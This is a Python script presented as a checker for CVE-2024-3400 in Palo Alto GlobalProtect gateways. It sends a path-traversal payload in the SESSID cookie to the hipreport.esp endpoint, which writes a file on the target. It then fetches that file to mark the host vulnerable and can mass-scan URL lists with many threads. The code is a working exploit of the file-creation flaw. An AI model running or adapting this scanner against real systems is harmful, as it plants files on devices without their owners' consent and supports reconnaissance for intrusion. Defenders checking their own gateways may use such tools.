from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar
import requests
from typing import List, Optional, Tuple
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def check_single_target(url:Optional[str])-> Tuple[str, bool]:
    headers={'Cookie': 'SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/CVE20243400.txt;'}
    post_url = f"{url}/ssl-vpn/hipreport.esp"
    get_url = f"{url}/global-protect/portal/images/CVE20243400.txt"
    requests.post(url=post_url, headers=headers,verify=False)
    response = requests.get(get_url,verify=False)
    if response.status_code == 403:
        print(f"\033[1;31m[+]\033[0m\t{url} is vulnerable.")
        result = True
    else:
        print(f"\033[1;32m[-]\033[0m\t{url} is not vulnerable.")
        result = False
    return f"{url} is vulnerable to CVE-2024-3400: {result}", result


def check_multi_targets(urls: List[str], max_workers: int = 20, output_path="Output.txt") -> None:
        with ThreadPoolExecutor(max_workers=max_workers) as executor, alive_bar(
                len(urls), enrich_print=False
        ) as bar:
            futures = {executor.submit(check_single_target, url): url for url in urls}
            for future in as_completed(futures):
                result, is_vulnerable = future.result()
                if is_vulnerable and output_path:
                    with open(output_path, "a") as file:
                        file.write(result + "\n")
                bar()

def main():
    Options = input("CVE-2024-3400 Checker:\n[1]\tSingle Target:\n[2]\tMulti Targets:\nInput:  ")
    if Options == "1":
        url = input("URL: ")
        check_single_target(url=url)
    elif Options == "2":
        input_path = input("Check List:  ")
        with open(input_path, "r") as f:
            url_list:List[str] = f.read().splitlines()
            check_multi_targets(urls=url_list)

        
if __name__ == "__main__":
    main()